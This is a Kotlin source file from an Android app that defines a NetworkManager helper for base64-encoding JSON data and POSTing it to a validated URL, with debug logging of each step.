package org.reddeaddeath.classicbotmazar.network

import android.util.Base64
import android.util.Log
import org.json.JSONObject
import java.io.BufferedReader
import java.io.InputStreamReader
import java.io.OutputStreamWriter
import java.net.HttpURLConnection
import java.net.URL
import javax.net.ssl.HttpsURLConnection

object NetworkManager {
    private const val TAG = "NetworkManager"

    init {
        SSLHelper
    }

    fun sendHTTPConnection(url: String, jsonData: JSONObject): Pair<Int?, String?> {
        Log.d(TAG, "Sending HTTP connection to: $url")
        if (!UrlValidator.isValidUrl(url)) {
            Log.d(TAG, "URL is invalid, aborting connection")
            return Pair(null, null)
        }
        return try {
            val jsonString = jsonData.toString()
            Log.d(TAG, "JSON data: $jsonString")
            val base64Encoded = Base64.encodeToString(
                jsonString.toByteArray(Charsets.UTF_8),
                Base64.NO_WRAP
            )
            Log.d(TAG, "Base64 encoded length: ${base64Encoded.length}")

            val urlObj = URL(url)
            Log.d(TAG, "Opening connection to: $urlObj (protocol: ${urlObj.protocol})")
            val connection = if (urlObj.protocol == "https") {
                urlObj.openConnection() as HttpsURLConnection
            } else {
                urlObj.openConnection() as HttpURLConnection
            }
            connection.requestMethod = "POST"
            connection.doOutput = true
            connection.instanceFollowRedirects = true
            connection.setRequestProperty("Content-Type", "application/json")
            connection.setRequestProperty("Content-Length", base64Encoded.length.toString())

            Log.d(TAG, "Writing data to connection...")
            OutputStreamWriter(connection.outputStream).use { writer ->
                writer.write(base64Encoded)
                writer.flush()
            }

            val responseCode = connection.responseCode
            Log.d(TAG, "Response code: $responseCode")
            
            var responseBody: String? = null
            if (responseCode in 200..299) {
                BufferedReader(InputStreamReader(connection.inputStream)).use { reader ->
                    responseBody = reader.readText()
                    Log.d(TAG, "Response body received, length: ${responseBody?.length}")
                }
            }
            
            connection.disconnect()
            Pair(responseCode, responseBody)
        } catch (e: Exception) {
            Log.d(TAG, "Error sending HTTP connection: ${e.message}")
            Pair(null, null)
        }
    }
}

